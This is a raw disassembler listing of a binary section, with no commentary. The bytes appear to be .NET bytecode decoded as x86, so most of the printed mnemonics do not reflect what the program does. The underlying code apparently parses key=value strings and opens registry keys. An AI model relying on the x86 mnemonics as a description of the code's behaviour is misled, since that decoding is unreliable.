  4046b0:	57                   	push   %edi
  4046b1:	00 70 6f             	add    %dh,0x6f(%eax)
  4046b4:	4b                   	dec    %ebx
  4046b5:	00 00                	add    %al,(%eax)
  4046b7:	0a 13                	or     (%ebx),%dl
  4046b9:	08 11                	or     %dl,(%ecx)
  4046bb:	08 2c 04             	or     %ch,(%esp,%eax,1)
  4046be:	00 17                	add    %dl,(%edi)
  4046c0:	0d 00 28 20 00       	or     $0x202800,%eax
  4046c5:	00 06                	add    %al,(%esi)
  4046c7:	00 73 4d             	add    %dh,0x4d(%ebx)
  4046ca:	00 00                	add    %al,(%eax)
  4046cc:	0a 13                	or     (%ebx),%dl
  4046ce:	04 11                	add    $0x11,%al
  4046d0:	04 28                	add    $0x28,%al
  4046d2:	08 00                	or     %al,(%eax)
  4046d4:	00 06                	add    %al,(%esi)
  4046d6:	6f                   	outsl  %ds:(%esi),(%dx)
  4046d7:	4e                   	dec    %esi
  4046d8:	00 00                	add    %al,(%eax)
  4046da:	0a 00                	or     (%eax),%al
  4046dc:	11 04 06             	adc    %eax,(%esi,%eax,1)
  4046df:	28 2b                	sub    %ch,(%ebx)
  4046e1:	00 00                	add    %al,(%eax)
  4046e3:	06                   	push   %es
  4046e4:	16                   	push   %ss
  4046e5:	fe 01                	incb   (%ecx)
  4046e7:	13 09                	adc    (%ecx),%ecx
  4046e9:	11 09                	adc    %ecx,(%ecx)
  4046eb:	2c 03                	sub    $0x3,%al
  4046ed:	00 2b                	add    %ch,(%ebx)
  4046ef:	7d 07                	jge    0x4046f8
  4046f1:	72 fe                	jb     0x4046f1
  4046f3:	4f                   	dec    %edi
  4046f4:	00 70 28             	add    %dh,0x28(%eax)
  4046f7:	4f                   	dec    %edi
  4046f8:	00 00                	add    %al,(%eax)
  4046fa:	0a 13                	or     (%ebx),%dl
  4046fc:	0a 11                	or     (%ecx),%dl
  4046fe:	0a 2c 61             	or     (%ecx,%eiz,2),%ch
  404701:	00 11                	add    %dl,(%ecx)
  404703:	04 07                	add    $0x7,%al
  404705:	28 14 00             	sub    %dl,(%eax,%eax,1)
  404708:	00 06                	add    %al,(%esi)
  40470a:	16                   	push   %ss
  40470b:	fe 01                	incb   (%ecx)
  40470d:	13 0b                	adc    (%ebx),%ecx
  40470f:	11 0b                	adc    %ecx,(%ebx)
  404711:	2c 03                	sub    $0x3,%al
  404713:	00 2b                	add    %ch,(%ebx)
  404715:	57                   	push   %edi
  404716:	11 04 08             	adc    %eax,(%eax,%ecx,1)
  404719:	28 15 00 00 06 16    	sub    %dl,0x16060000
  40471f:	fe 01                	incb   (%ecx)
  404721:	13 0c 11             	adc    (%ecx,%edx,1),%ecx
  404724:	0c 2c                	or     $0x2c,%al
  404726:	03 00                	add    (%eax),%eax
  404728:	2b 43 11             	sub    0x11(%ebx),%eax
  40472b:	04 7e                	add    $0x7e,%al
  40472d:	15 00 00 04 28       	adc    $0x28040000,%eax
  404732:	19 00                	sbb    %eax,(%eax)
  404734:	00 06                	add    %al,(%esi)
  404736:	16                   	push   %ss
  404737:	fe 01                	incb   (%ecx)
  404739:	13 0d 11 0d 2c 03    	adc    0x32c0d11,%ecx
  40473f:	00 2b                	add    %ch,(%ebx)
  404741:	2b 09                	sub    (%ecx),%ecx
  404743:	16                   	push   %ss
  404744:	fe 01                	incb   (%ecx)
  404746:	13 0e                	adc    (%esi),%ecx
  404748:	11 0e                	adc    %ecx,(%esi)
  40474a:	2c 15                	sub    $0x15,%al
  40474c:	00 11                	add    %dl,(%ecx)
  40474e:	04 28                	add    $0x28,%al
  404750:	17                   	pop    %ss
  404751:	00 00                	add    %al,(%eax)
  404753:	06                   	push   %es
  404754:	16                   	push   %ss
  404755:	fe 01                	incb   (%ecx)
  404757:	13 0f                	adc    (%edi),%ecx
  404759:	11 0f                	adc    %ecx,(%edi)
  40475b:	2c 03                	sub    $0x3,%al
  40475d:	00 2b                	add    %ch,(%ebx)
  40475f:	0d 00 00 72 c7       	or     $0xc7720000,%eax
  404764:	57                   	push   %edi
  404765:	00 70 28             	add    %dh,0x28(%eax)
  404768:	1e                   	push   %ds
  404769:	00 00                	add    %al,(%eax)
  40476b:	0a 00                	or     (%eax),%al
  40476d:	2a 22                	sub    (%edx),%ah
  40476f:	02 28                	add    (%eax),%ch
  404771:	25 00 00 0a 00       	and    $0xa0000,%eax
  404776:	2a 1a                	sub    (%edx),%bl
  404778:	72 f7                	jb     0x404771
  40477a:	57                   	push   %edi
  40477b:	00 70 2a             	add    %dh,0x2a(%eax)
  40477e:	7a 00                	jp     0x404780
  404780:	72 05                	jb     0x404787
  404782:	58                   	pop    %eax
  404783:	00 70 28             	add    %dh,0x28(%eax)
  404786:	1e                   	push   %ds
  404787:	00 00                	add    %al,(%eax)
  404789:	0a 00                	or     (%eax),%al
  40478b:	28 0e                	sub    %cl,(%esi)
  40478d:	00 00                	add    %al,(%eax)
  40478f:	06                   	push   %es
  404790:	26 72 43             	es jb  0x4047d6
  404793:	58                   	pop    %eax
  404794:	00 70 28             	add    %dh,0x28(%eax)
  404797:	1e                   	push   %ds
  404798:	00 00                	add    %al,(%eax)
  40479a:	0a 00                	or     (%eax),%al
  40479c:	2a 22                	sub    (%edx),%ah
  40479e:	02 28                	add    (%eax),%ch
  4047a0:	25 00 00 0a 00       	and    $0xa0000,%eax
  4047a5:	2a 1a                	sub    (%edx),%bl
  4047a7:	72 73                	jb     0x40481c
  4047a9:	58                   	pop    %eax
  4047aa:	00 70 2a             	add    %dh,0x2a(%eax)
  4047ad:	00 00                	add    %al,(%eax)
  4047af:	00 13                	add    %dl,(%ebx)
  4047b1:	30 02                	xor    %al,(%edx)
  4047b3:	00 4c 00 00          	add    %cl,0x0(%eax,%eax,1)
  4047b7:	00 1f                	add    %bl,(%edi)
  4047b9:	00 00                	add    %al,(%eax)
  4047bb:	11 00                	adc    %eax,(%eax)
  4047bd:	72 83                	jb     0x404742
  4047bf:	58                   	pop    %eax
  4047c0:	00 70 28             	add    %dh,0x28(%eax)
  4047c3:	1e                   	push   %ds
  4047c4:	00 00                	add    %al,(%eax)
  4047c6:	0a 00                	or     (%eax),%al
  4047c8:	28 20                	sub    %ah,(%eax)
  4047ca:	00 00                	add    %al,(%eax)
  4047cc:	06                   	push   %es
  4047cd:	00 73 4d             	add    %dh,0x4d(%ebx)
  4047d0:	00 00                	add    %al,(%eax)
  4047d2:	0a 0a                	or     (%edx),%cl
  4047d4:	06                   	push   %es
  4047d5:	28 08                	sub    %cl,(%eax)
  4047d7:	00 00                	add    %al,(%eax)
  4047d9:	06                   	push   %es
  4047da:	6f                   	outsl  %ds:(%esi),(%dx)
  4047db:	4e                   	dec    %esi
  4047dc:	00 00                	add    %al,(%eax)
  4047de:	0a 00                	or     (%eax),%al
  4047e0:	06                   	push   %es
  4047e1:	28 0a                	sub    %cl,(%edx)
  4047e3:	00 00                	add    %al,(%eax)
  4047e5:	06                   	push   %es
  4047e6:	26 06                	es push %es
  4047e8:	28 0b                	sub    %cl,(%ebx)
  4047ea:	00 00                	add    %al,(%eax)
  4047ec:	06                   	push   %es
  4047ed:	26 06                	es push %es
  4047ef:	28 0c 00             	sub    %cl,(%eax,%eax,1)
  4047f2:	00 06                	add    %al,(%esi)
  4047f4:	26 06                	es push %es
  4047f6:	28 0d 00 00 06 26    	sub    %cl,0x26060000
  4047fc:	72 c3                	jb     0x4047c1
  4047fe:	58                   	pop    %eax
  4047ff:	00 70 28             	add    %dh,0x28(%eax)
  404802:	1e                   	push   %ds
  404803:	00 00                	add    %al,(%eax)
  404805:	0a 00                	or     (%eax),%al
  404807:	2a 22                	sub    (%edx),%ah
  404809:	02 28                	add    (%eax),%ch
  40480b:	25 00 00 0a 00       	and    $0xa0000,%eax
  404810:	2a 00                	sub    (%eax),%al
  404812:	00 00                	add    %al,(%eax)
  404814:	1b 30                	sbb    (%eax),%esi
  404816:	05 00 c5 00 00       	add    $0xc500,%eax
  40481b:	00 20                	add    %ah,(%eax)
  40481d:	00 00                	add    %al,(%eax)
  40481f:	11 00                	adc    %eax,(%eax)
  404821:	73 50                	jae    0x404873
  404823:	00 00                	add    %al,(%eax)
  404825:	0a 0a                	or     (%edx),%cl
  404827:	00 00                	add    %al,(%eax)
  404829:	02 6f 51             	add    0x51(%edi),%ch
  40482c:	00 00                	add    %al,(%eax)
  40482e:	0a 0b                	or     (%ebx),%cl
  404830:	2b 78 07             	sub    0x7(%eax),%edi
  404833:	6f                   	outsl  %ds:(%esi),(%dx)
  404834:	52                   	push   %edx
  404835:	00 00                	add    %al,(%eax)
  404837:	0a 0c 00             	or     (%eax,%eax,1),%cl
  40483a:	08 1f                	or     %bl,(%edi)
  40483c:	3a 6f 53             	cmp    0x53(%edi),%ch
  40483f:	00 00                	add    %al,(%eax)
  404841:	0a 0d 09 16 fe 02    	or     0x2fe1609,%cl
  404847:	13 04 11             	adc    (%ecx,%edx,1),%eax
  40484a:	04 2c                	add    $0x2c,%al
  40484c:	1c 00                	sbb    $0x0,%al
  40484e:	06                   	push   %es
  40484f:	08 16                	or     %dl,(%esi)
  404851:	09 6f 44             	or     %ebp,0x44(%edi)
  404854:	00 00                	add    %al,(%eax)
  404856:	0a 08                	or     (%eax),%cl
  404858:	09 17                	or     %edx,(%edi)
  40485a:	58                   	pop    %eax
  40485b:	6f                   	outsl  %ds:(%esi),(%dx)
  40485c:	54                   	push   %esp
  40485d:	00 00                	add    %al,(%eax)
  40485f:	0a 6f 55             	or     0x55(%edi),%ch
  404862:	00 00                	add    %al,(%eax)
  404864:	0a 00                	or     (%eax),%al
  404866:	00 2b                	add    %ch,(%ebx)
  404868:	40                   	inc    %eax
  404869:	00 08                	add    %cl,(%eax)
  40486b:	1f                   	pop    %ds
  40486c:	3d 6f 53 00 00       	cmp    $0x536f,%eax
  404871:	0a 0d 09 16 fe 02    	or     0x2fe1609,%cl
  404877:	13 05 11 05 2c 1c    	adc    0x1c2c0511,%eax
  40487d:	00 06                	add    %al,(%esi)
  40487f:	08 16                	or     %dl,(%esi)
  404881:	09 6f 44             	or     %ebp,0x44(%edi)
  404884:	00 00                	add    %al,(%eax)
  404886:	0a 08                	or     (%eax),%cl
  404888:	09 17                	or     %edx,(%edi)
  40488a:	58                   	pop    %eax
  40488b:	6f                   	outsl  %ds:(%esi),(%dx)
  40488c:	54                   	push   %esp
  40488d:	00 00                	add    %al,(%eax)
  40488f:	0a 6f 55             	or     0x55(%edi),%ch
  404892:	00 00                	add    %al,(%eax)
  404894:	0a 00                	or     (%eax),%al
  404896:	00 2b                	add    %ch,(%ebx)
  404898:	0f 00 06             	sldt   (%esi)
  40489b:	08 7e 23             	or     %bh,0x23(%esi)
  40489e:	00 00                	add    %al,(%eax)
  4048a0:	0a 6f 55             	or     0x55(%edi),%ch
  4048a3:	00 00                	add    %al,(%eax)
  4048a5:	0a 00                	or     (%eax),%al
  4048a7:	00 00                	add    %al,(%eax)
  4048a9:	00 07                	add    %al,(%edi)
  4048ab:	6f                   	outsl  %ds:(%esi),(%dx)
  4048ac:	56                   	push   %esi
  4048ad:	00 00                	add    %al,(%eax)
  4048af:	0a 2d 80 de 0b 07    	or     0x70bde80,%ch
  4048b5:	2c 07                	sub    $0x7,%al
  4048b7:	07                   	pop    %es
  4048b8:	6f                   	outsl  %ds:(%esi),(%dx)
  4048b9:	57                   	push   %edi
  4048ba:	00 00                	add    %al,(%eax)
  4048bc:	0a 00                	or     (%eax),%al
  4048be:	dc 06                	faddl  (%esi)
  4048c0:	28 49 00             	sub    %cl,0x0(%ecx)
  4048c3:	00 06                	add    %al,(%esi)
  4048c5:	13 06                	adc    (%esi),%eax
  4048c7:	de 19                	ficomps (%ecx)
  4048c9:	13 07                	adc    (%edi),%eax
  4048cb:	00 11                	add    %dl,(%ecx)
  4048cd:	07                   	pop    %es
  4048ce:	6f                   	outsl  %ds:(%esi),(%dx)
  4048cf:	21 00                	and    %eax,(%eax)
  4048d1:	00 0a                	add    %cl,(%edx)
  4048d3:	28 58 00             	sub    %bl,0x0(%eax)
  4048d6:	00 0a                	add    %cl,(%edx)
  4048d8:	00 28                	add    %ch,(%eax)
  4048da:	4a                   	dec    %edx
  4048db:	00 00                	add    %al,(%eax)
  4048dd:	06                   	push   %es
  4048de:	13 06                	adc    (%esi),%eax
  4048e0:	de 00                	fiadds (%eax)
  4048e2:	11 06                	adc    %eax,(%esi)
  4048e4:	2a 00                	sub    (%eax),%al
  4048e6:	00 00                	add    %al,(%eax)
  4048e8:	01 1c 00             	add    %ebx,(%eax,%eax,1)
  4048eb:	00 02                	add    %al,(%edx)
  4048ed:	00 10                	add    %dl,(%eax)
  4048ef:	00 84 94 00 0b 00 00 	add    %al,0xb00(%esp,%edx,4)
  4048f6:	00 00                	add    %al,(%eax)
  4048f8:	00 00                	add    %al,(%eax)
  4048fa:	07                   	pop    %es
  4048fb:	00 a2 a9 00 19 16    	add    %ah,0x161900a9(%edx)
  404901:	00 00                	add    %al,(%eax)
  404903:	01 1e                	add    %ebx,(%esi)
  404905:	02 7b 20             	add    0x20(%ebx),%bh
  404908:	00 00                	add    %al,(%eax)
  40490a:	04 2a                	add    $0x2a,%al
  40490c:	1e                   	push   %ds
  40490d:	02 7b 21             	add    0x21(%ebx),%bh
  404910:	00 00                	add    %al,(%eax)
  404912:	04 2a                	add    $0x2a,%al
  404914:	5e                   	pop    %esi
  404915:	02 28                	add    (%eax),%ch
  404917:	25 00 00 0a 00       	and    $0xa0000,%eax
  40491c:	00 02                	add    %al,(%edx)
  40491e:	03 7d 20             	add    0x20(%ebp),%edi
  404921:	00 00                	add    %al,(%eax)
  404923:	04 02                	add    $0x2,%al
  404925:	04 7d                	add    $0x7d,%al
  404927:	21 00                	and    %eax,(%eax)
  404929:	00 04 2a             	add    %al,(%edx,%ebp,1)
  40492c:	22 17                	and    (%edi),%dl
  40492e:	02 73 48             	add    0x48(%ebx),%dh
  404931:	00 00                	add    %al,(%eax)
  404933:	06                   	push   %es
  404934:	2a 22                	sub    (%edx),%ah
  404936:	16                   	push   %ss
  404937:	14 73                	adc    $0x73,%al
  404939:	48                   	dec    %eax
  40493a:	00 00                	add    %al,(%eax)
  40493c:	06                   	push   %es
  40493d:	2a 00                	sub    (%eax),%al
  40493f:	00 13                	add    %dl,(%ebx)
  404941:	30 04 00             	xor    %al,(%eax,%eax,1)
  404944:	34 01                	xor    $0x1,%al
  404946:	00 00                	add    %al,(%eax)
  404948:	00 00                	add    %al,(%eax)
  40494a:	00 00                	add    %al,(%eax)
  40494c:	02 73 59             	add    0x59(%ebx),%dh
  40494f:	00 00                	add    %al,(%eax)
  404951:	0a 7d 22             	or     0x22(%ebp),%bh
  404954:	00 00                	add    %al,(%eax)
  404956:	04 02                	add    $0x2,%al
  404958:	28 25 00 00 0a 00    	sub    %ah,0xa0000
  40495e:	00 02                	add    %al,(%edx)
  404960:	7b 22                	jnp    0x404984
  404962:	00 00                	add    %al,(%eax)
  404964:	04 28                	add    $0x28,%al
  404966:	37                   	aaa
  404967:	00 00                	add    %al,(%eax)
  404969:	06                   	push   %es
  40496a:	7e 34                	jle    0x4049a0
  40496c:	00 00                	add    %al,(%eax)
  40496e:	04 25                	add    $0x25,%al
  404970:	2d 17 26 7e 33       	sub    $0x337e2617,%eax
  404975:	00 00                	add    %al,(%eax)
  404977:	04 fe                	add    $0xfe,%al
  404979:	06                   	push   %es
  40497a:	59                   	pop    %ecx
  40497b:	00 00                	add    %al,(%eax)
  40497d:	06                   	push   %es
  40497e:	73 5a                	jae    0x4049da
  404980:	00 00                	add    %al,(%eax)
  404982:	0a 25 80 34 00 00    	or     0x3480,%ah
  404988:	04 6f                	add    $0x6f,%al
  40498a:	5b                   	pop    %ebx
  40498b:	00 00                	add    %al,(%eax)
  40498d:	0a 00                	or     (%eax),%al
  40498f:	02 7b 22             	add    0x22(%ebx),%bh
  404992:	00 00                	add    %al,(%eax)
  404994:	04 28                	add    $0x28,%al
  404996:	31 00                	xor    %eax,(%eax)
  404998:	00 06                	add    %al,(%esi)
  40499a:	7e 35                	jle    0x4049d1
  40499c:	00 00                	add    %al,(%eax)
  40499e:	04 25                	add    $0x25,%al
  4049a0:	2d 17 26 7e 33       	sub    $0x337e2617,%eax
  4049a5:	00 00                	add    %al,(%eax)
  4049a7:	04 fe                	add    $0xfe,%al
  4049a9:	06                   	push   %es
  4049aa:	5a                   	pop    %edx
  4049ab:	00 00                	add    %al,(%eax)
  4049ad:	06                   	push   %es
  4049ae:	73 5a                	jae    0x404a0a
  4049b0:	00 00                	add    %al,(%eax)
  4049b2:	0a 25 80 35 00 00    	or     0x3580,%ah
  4049b8:	04 6f                	add    $0x6f,%al
  4049ba:	5b                   	pop    %ebx
  4049bb:	00 00                	add    %al,(%eax)
  4049bd:	0a 00                	or     (%eax),%al
  4049bf:	02 7b 22             	add    0x22(%ebx),%bh
  4049c2:	00 00                	add    %al,(%eax)
  4049c4:	04 28                	add    $0x28,%al
  4049c6:	34 00                	xor    $0x0,%al
  4049c8:	00 06                	add    %al,(%esi)
  4049ca:	7e 36                	jle    0x404a02
  4049cc:	00 00                	add    %al,(%eax)
  4049ce:	04 25                	add    $0x25,%al
  4049d0:	2d 17 26 7e 33       	sub    $0x337e2617,%eax
  4049d5:	00 00                	add    %al,(%eax)
  4049d7:	04 fe                	add    $0xfe,%al
  4049d9:	06                   	push   %es
  4049da:	5b                   	pop    %ebx
  4049db:	00 00                	add    %al,(%eax)
  4049dd:	06                   	push   %es
  4049de:	73 5a                	jae    0x404a3a
  4049e0:	00 00                	add    %al,(%eax)
  4049e2:	0a 25 80 36 00 00    	or     0x3680,%ah
  4049e8:	04 6f                	add    $0x6f,%al
  4049ea:	5b                   	pop    %ebx
  4049eb:	00 00                	add    %al,(%eax)
  4049ed:	0a 00                	or     (%eax),%al
  4049ef:	02 7b 22             	add    0x22(%ebx),%bh
  4049f2:	00 00                	add    %al,(%eax)
  4049f4:	04 28                	add    $0x28,%al
  4049f6:	3b 00                	cmp    (%eax),%eax
  4049f8:	00 06                	add    %al,(%esi)
  4049fa:	7e 37                	jle    0x404a33
  4049fc:	00 00                	add    %al,(%eax)
  4049fe:	04 25                	add    $0x25,%al
  404a00:	2d 17 26 7e 33       	sub    $0x337e2617,%eax
  404a05:	00 00                	add    %al,(%eax)
  404a07:	04 fe                	add    $0xfe,%al
  404a09:	06                   	push   %es
  404a0a:	5c                   	pop    %esp
  404a0b:	00 00                	add    %al,(%eax)
  404a0d:	06                   	push   %es
  404a0e:	73 5a                	jae    0x404a6a
  404a10:	00 00                	add    %al,(%eax)
  404a12:	0a 25 80 37 00 00    	or     0x3780,%ah
  404a18:	04 6f                	add    $0x6f,%al
  404a1a:	5b                   	pop    %ebx
  404a1b:	00 00                	add    %al,(%eax)
  404a1d:	0a 00                	or     (%eax),%al
  404a1f:	02 7b 22             	add    0x22(%ebx),%bh
  404a22:	00 00                	add    %al,(%eax)
  404a24:	04 28                	add    $0x28,%al
  404a26:	42                   	inc    %edx
  404a27:	00 00                	add    %al,(%eax)
  404a29:	06                   	push   %es
  404a2a:	7e 38                	jle    0x404a64
  404a2c:	00 00                	add    %al,(%eax)
  404a2e:	04 25                	add    $0x25,%al
  404a30:	2d 17 26 7e 33       	sub    $0x337e2617,%eax
  404a35:	00 00                	add    %al,(%eax)
  404a37:	04 fe                	add    $0xfe,%al
  404a39:	06                   	push   %es
  404a3a:	5d                   	pop    %ebp
  404a3b:	00 00                	add    %al,(%eax)
  404a3d:	06                   	push   %es
  404a3e:	73 5a                	jae    0x404a9a
  404a40:	00 00                	add    %al,(%eax)
  404a42:	0a 25 80 38 00 00    	or     0x3880,%ah
  404a48:	04 6f                	add    $0x6f,%al
  404a4a:	5b                   	pop    %ebx
  404a4b:	00 00                	add    %al,(%eax)
  404a4d:	0a 00                	or     (%eax),%al
  404a4f:	02 7b 22             	add    0x22(%ebx),%bh
  404a52:	00 00                	add    %al,(%eax)
  404a54:	04 28                	add    $0x28,%al
  404a56:	3f                   	aas
  404a57:	00 00                	add    %al,(%eax)
  404a59:	06                   	push   %es
  404a5a:	7e 39                	jle    0x404a95
  404a5c:	00 00                	add    %al,(%eax)
  404a5e:	04 25                	add    $0x25,%al
  404a60:	2d 17 26 7e 33       	sub    $0x337e2617,%eax
  404a65:	00 00                	add    %al,(%eax)
  404a67:	04 fe                	add    $0xfe,%al
  404a69:	06                   	push   %es
  404a6a:	5e                   	pop    %esi
  404a6b:	00 00                	add    %al,(%eax)
  404a6d:	06                   	push   %es
  404a6e:	73 5a                	jae    0x404aca
  404a70:	00 00                	add    %al,(%eax)
  404a72:	0a 25 80 39 00 00    	or     0x3980,%ah
  404a78:	04 6f                	add    $0x6f,%al
  404a7a:	5b                   	pop    %ebx
  404a7b:	00 00                	add    %al,(%eax)
  404a7d:	0a 00                	or     (%eax),%al
  404a7f:	2a 13                	sub    (%ebx),%dl
  404a81:	30 02                	xor    %al,(%edx)
  404a83:	00 47 00             	add    %al,0x0(%edi)
  404a86:	00 00                	add    %al,(%eax)
  404a88:	21 00                	and    %eax,(%eax)
  404a8a:	00 11                	add    %dl,(%ecx)
  404a8c:	00 03                	add    %al,(%ebx)
  404a8e:	28 5c 00 00          	sub    %bl,0x0(%eax,%eax,1)
  404a92:	0a 2d 11 02 7b 22    	or     0x227b0211,%ch
  404a98:	00 00                	add    %al,(%eax)
  404a9a:	04 03                	add    $0x3,%al
  404a9c:	6f                   	outsl  %ds:(%esi),(%dx)
  404a9d:	5d                   	pop    %ebp
  404a9e:	00 00                	add    %al,(%eax)
  404aa0:	0a 16                	or     (%esi),%dl
  404aa2:	fe 01                	incb   (%ecx)
  404aa4:	2b 01                	sub    (%ecx),%eax
  404aa6:	17                   	pop    %ss
  404aa7:	0b 07                	or     (%edi),%eax
  404aa9:	2c 04                	sub    $0x4,%al
  404aab:	16                   	push   %ss
  404aac:	0a 2b                	or     (%ebx),%ch
  404aae:	1e                   	push   %ds
  404aaf:	00 02                	add    %al,(%edx)
  404ab1:	7b 22                	jnp    0x404ad5
  404ab3:	00 00                	add    %al,(%eax)
  404ab5:	04 03                	add    $0x3,%al
  404ab7:	6f                   	outsl  %ds:(%esi),(%dx)
  404ab8:	5e                   	pop    %esi
  404ab9:	00 00                	add    %al,(%eax)
  404abb:	0a 6f 5f             	or     0x5f(%edi),%ch
  404abe:	00 00                	add    %al,(%eax)
  404ac0:	0a 0c 08             	or     (%eax,%ecx,1),%cl
  404ac3:	04 6f                	add    $0x6f,%al
  404ac5:	3e 00 00             	add    %al,%ds:(%eax)
  404ac8:	06                   	push   %es
  404ac9:	00 17                	add    %dl,(%edi)
  404acb:	0a 00                	or     (%eax),%al
  404acd:	06                   	push   %es
  404ace:	0d 2b 00 09 2a       	or     $0x2a09002b,%eax
  404ad3:	00 13                	add    %dl,(%ebx)
  404ad5:	30 01                	xor    %al,(%ecx)
  404ad7:	00 0f                	add    %cl,(%edi)
  404ad9:	00 00                	add    %al,(%eax)
  404adb:	00 22                	add    %ah,(%edx)
  404add:	00 00                	add    %al,(%eax)
  404adf:	11 00                	adc    %eax,(%eax)
  404ae1:	72 f5                	jb     0x404ad8
  404ae3:	58                   	pop    %eax
  404ae4:	00 70 0a             	add    %dh,0xa(%eax)
  404ae7:	06                   	push   %es
  404ae8:	28 1e                	sub    %bl,(%esi)
  404aea:	00 00                	add    %al,(%eax)
  404aec:	0a 00                	or     (%eax),%al
  404aee:	2a 00                	sub    (%eax),%al
  404af0:	13 30                	adc    (%eax),%esi
  404af2:	01 00                	add    %eax,(%eax)
  404af4:	0f 00 00             	sldt   (%eax)
  404af7:	00 22                	add    %ah,(%edx)
  404af9:	00 00                	add    %al,(%eax)
  404afb:	11 00                	adc    %eax,(%eax)
  404afd:	72 d2                	jb     0x404ad1
  404aff:	5b                   	pop    %ebx
  404b00:	00 70 0a             	add    %dh,0xa(%eax)
  404b03:	06                   	push   %es
  404b04:	28 1e                	sub    %bl,(%esi)
  404b06:	00 00                	add    %al,(%eax)
  404b08:	0a 00                	or     (%eax),%al
  404b0a:	2a 7e 20             	sub    0x20(%esi),%bh
  404b0d:	02 00                	add    (%eax),%al
  404b0f:	00 80 73 60 00 00    	add    %al,0x6073(%eax)
  404b15:	0a 80 31 00 00 04    	or     0x4000031(%eax),%al
  404b1b:	20 01                	and    %al,(%ecx)
  404b1d:	00 00                	add    %al,(%eax)
  404b1f:	80 73 60 00          	xorb   $0x0,0x60(%ebx)
  404b23:	00 0a                	add    %cl,(%edx)
  404b25:	80 32 00             	xorb   $0x0,(%edx)
  404b28:	00 04 2a             	add    %al,(%edx,%ebp,1)
  404b2b:	00 13                	add    %dl,(%ebx)
  404b2d:	30 04 00             	xor    %al,(%eax,%eax,1)
  404b30:	13 00                	adc    (%eax),%eax
  404b32:	00 00                	add    %al,(%eax)
  404b34:	22 00                	and    (%eax),%al
  404b36:	00 11                	add    %dl,(%ecx)
  404b38:	00 02                	add    %al,(%edx)
  404b3a:	03 20                	add    (%eax),%esp
  404b3c:	00 01                	add    %al,(%ecx)
  404b3e:	00 00                	add    %al,(%eax)
  404b40:	04 28                	add    $0x28,%al
  404b42:	55                   	push   %ebp
  404b43:	00 00                	add    %al,(%eax)
  404b45:	06                   	push   %es
  404b46:	0a 2b                	or     (%ebx),%ch
  404b48:	00 06                	add    %al,(%esi)
  404b4a:	2a 00                	sub    (%eax),%al
  404b4c:	13 30                	adc    (%eax),%esi
  404b4e:	04 00                	add    $0x0,%al
  404b50:	13 00                	adc    (%eax),%eax
  404b52:	00 00                	add    %al,(%eax)
  404b54:	22 00                	and    (%eax),%al
  404b56:	00 11                	add    %dl,(%ecx)
  404b58:	00 02                	add    %al,(%edx)
  404b5a:	03 20                	add    (%eax),%esp
  404b5c:	00 02                	add    %al,(%edx)
  404b5e:	00 00                	add    %al,(%eax)
  404b60:	04 28                	add    $0x28,%al
  404b62:	55                   	push   %ebp
  404b63:	00 00                	add    %al,(%eax)
  404b65:	06                   	push   %es
  404b66:	0a 2b                	or     (%ebx),%ch
  404b68:	00 06                	add    %al,(%esi)
  404b6a:	2a 00                	sub    (%eax),%al
  404b6c:	1b 30                	sbb    (%eax),%esi
  404b6e:	06                   	push   %es
  404b6f:	00 98 00 00 00 23    	add    %bl,0x23000000(%eax)
  404b75:	00 00                	add    %al,(%eax)
  404b77:	11 00                	adc    %eax,(%eax)
  404b79:	16                   	push   %ss
  404b7a:	0a 00                	or     (%eax),%al
  404b7c:	7e 31                	jle    0x404baf
  404b7e:	00 00                	add    %al,(%eax)
  404b80:	04 03                	add    $0x3,%al
  404b82:	16                   	push   %ss
  404b83:	17                   	pop    %ss
  404b84:	04 60                	add    $0x60,%al
  404b86:	12 00                	adc    (%eax),%al
  404b88:	28 50 00             	sub    %dl,0x0(%eax)
  404b8b:	00 06                	add    %al,(%esi)
  404b8d:	0b 07                	or     (%edi),%eax
  404b8f:	16                   	push   %ss
  404b90:	fe 03                	incb   (%ebx)
  404b92:	13 07                	adc    (%edi),%eax
  404b94:	11 07                	adc    %eax,(%edi)
  404b96:	2c 0a                	sub    $0xa,%al
  404b98:	00 72 9a             	add    %dh,-0x66(%edx)
  404b9b:	45                   	inc    %ebp
  404b9c:	00 70 13             	add    %dh,0x13(%eax)
  404b9f:	08 de                	or     %bl,%dh
  404ba1:	6b 16 0c             	imul   $0xc,(%esi),%edx
  404ba4:	20 00                	and    %al,(%eax)
  404ba6:	04 00                	add    $0x0,%al
  404ba8:	00 0d 20 00 04 00    	add    %cl,0x40020
  404bae:	00 73 61             	add    %dh,0x61(%ebx)
  404bb1:	00 00                	add    %al,(%eax)
  404bb3:	0a 13                	or     (%ebx),%dl
  404bb5:	04 06                	add    $0x6,%al
  404bb7:	05 16 12 02 11       	add    $0x11021216,%eax
  404bbc:	04 12                	add    $0x12,%al
  404bbe:	03 28                	add    (%eax),%ebp
  404bc0:	52                   	push   %edx
  404bc1:	00 00                	add    %al,(%eax)
  404bc3:	06                   	push   %es
  404bc4:	13 05 11 05 16 fe    	adc    0xfe160511,%eax
  404bca:	03 13                	add    (%ebx),%edx
  404bcc:	09 11                	or     %edx,(%ecx)
  404bce:	09 2c 0a             	or     %ebp,(%edx,%ecx,1)
  404bd1:	00 72 9a             	add    %dh,-0x66(%edx)
  404bd4:	45                   	inc    %ebp
  404bd5:	00 70 13             	add    %dh,0x13(%eax)
  404bd8:	08 de                	or     %bl,%dh
  404bda:	32 28                	xor    (%eax),%ch
  404bdc:	62 00                	bound  %eax,(%eax)
  404bde:	00 0a                	add    %cl,(%edx)
